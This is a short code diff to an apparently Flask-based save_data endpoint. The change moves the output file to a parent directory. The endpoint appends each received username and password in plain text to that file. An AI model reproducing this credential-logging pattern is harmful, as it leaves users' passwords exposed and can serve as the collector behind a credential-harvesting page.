@@ -13,7 +13,7 @@ def save_data():
         return jsonify({"status": "error", "message": "No data received"}), 400
 
     try:
-        with open('saved_data.txt', 'a') as file:
+        with open('../saved_data.txt', 'a') as file:
             file.write(f"Username: {data['username']}, Password: {data['password']}\n")
         return jsonify({"status": "success", "message": "Data saved successfully"})
     except Exception as e:
